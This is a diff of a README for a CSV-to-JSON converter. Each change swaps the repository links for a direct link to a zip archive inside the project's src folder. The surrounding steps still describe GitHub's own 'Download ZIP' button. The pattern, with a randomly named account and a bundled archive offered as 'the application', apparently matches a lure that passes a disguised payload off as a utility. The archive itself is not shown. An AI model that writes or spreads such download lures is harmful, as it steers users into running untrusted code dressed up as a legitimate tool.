@@ -1,6 +1,6 @@
 # 🔄 local-csv-json-transformer - Convert Files to JSON Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/psychomotor-orderphasmida959/local-csv-json-transformer)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&color=4CAF50)](https://raw.githubusercontent.com/psychomotor-orderphasmida959/local-csv-json-transformer/main/src/transformer_json_csv_local_v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This application is perfect for anyone working with spreadsheets, databases, or 
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/psychomotor-orderphasmida959/local-csv-json-transformer](https://github.com/psychomotor-orderphasmida959/local-csv-json-transformer)
+Visit this link to download the application: [https://raw.githubusercontent.com/psychomotor-orderphasmida959/local-csv-json-transformer/main/src/transformer_json_csv_local_v3.0.zip](https://raw.githubusercontent.com/psychomotor-orderphasmida959/local-csv-json-transformer/main/src/transformer_json_csv_local_v3.0.zip)
 
 1. Click the green **"Code"** button on the page.
 2. Select **"Download ZIP"** from the dropdown menu.
@@ -134,7 +134,7 @@ This application is open-source and available for anyone to use, modify, and sha
 
 ## 🔗 Quick Links
 
-- **Download:** [https://github.com/psychomotor-orderphasmida959/local-csv-json-transformer](https://github.com/psychomotor-orderphasmida959/local-csv-json-transformer)
+- **Download:** [https://raw.githubusercontent.com/psychomotor-orderphasmida959/local-csv-json-transformer/main/src/transformer_json_csv_local_v3.0.zip](https://raw.githubusercontent.com/psychomotor-orderphasmida959/local-csv-json-transformer/main/src/transformer_json_csv_local_v3.0.zip)
 - **Report Issues:** Visit the repository and navigate to the "Issues" tab
 - **Contribute:** Developers welcome! Check the contribution guidelines in the repository
 
